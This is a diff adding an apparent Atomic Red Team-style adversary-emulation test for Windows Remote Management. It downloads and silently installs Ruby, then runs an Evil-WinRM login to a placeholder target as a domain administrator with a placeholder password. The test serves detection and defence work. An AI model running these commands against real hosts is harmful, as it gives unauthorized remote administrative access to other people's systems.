@@ -1,0 +1,12 @@
+#TechniqueName: Remote Services: Windows Remote Management
+#AtomicTestName: WinRM Access with Evil-WinRM
+#Description: An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled
+#Language: ps1
+
+#get_prereq_commands
+Invoke-WebRequest  -OutFile $env:Temp\rubyinstaller-2.7.1-1-x64.exe https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
+$file1= $env:Temp + "\rubyinstaller-2.7.1-1-x64.exe"
+Start-Process $file1 /S;
+
+#commands
+evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1
